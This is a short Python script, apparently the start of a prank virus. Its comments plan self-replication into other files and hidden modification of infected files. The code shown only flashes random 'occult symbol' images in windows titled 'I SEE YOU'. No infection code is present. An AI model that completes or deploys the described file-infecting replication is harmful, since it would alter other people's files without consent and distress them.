# the purpose of the program is :
    # 1. at runtime, starts to display more and more occult symbols as time goes by, 
        # which disappear almost immediately after their appearance.
    # 2. replicates itself in files: with each infected file (thus with each replication), a horrific image is displayed, 
        # then disappears almost immediately. 
        # So as time goes by, more and more horrific images will be displayed, faster and more often.
    # 3. modifies infected files to hide occult symbols, horrific images, and creepy sentences.


import sys # to access the system
import cv2
from threading import Timer
import tkinter as tk
import random
import os

root = tk.Tk()

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
symbols_folder = "symbols/"


for i in range(15):
    symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
    img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
    cv2.imshow("I SEE YOU" + str(i), img)
    cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
    i += 1
    cv2.waitKey(800)
    cv2.destroyWindow("I SEE YOU" + str(i-3))